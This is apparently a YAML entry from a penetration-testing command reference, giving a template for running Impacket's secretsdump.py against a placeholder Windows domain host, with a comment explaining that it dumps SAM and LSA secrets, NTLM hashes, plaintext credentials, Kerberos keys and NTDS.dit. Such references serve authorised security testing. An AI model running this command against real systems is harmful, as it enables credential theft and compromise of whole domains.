commands:
- template: python3 secretsdump.py test.local/john:password123@10.10.10.1
  comment: "Impacket's secretsdump.py will perform various techniques to dump secrets from the remote\
    \ machine without executing any agent. Techniques include reading SAM and LSA secrets from registries,\
    \ dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following\
    \ command will attempt to dump all secrets from the target machine using the previously mentioned\
    \ techniques.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername:\
    \ john\n\n\tPassword: password123\n"
references:
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
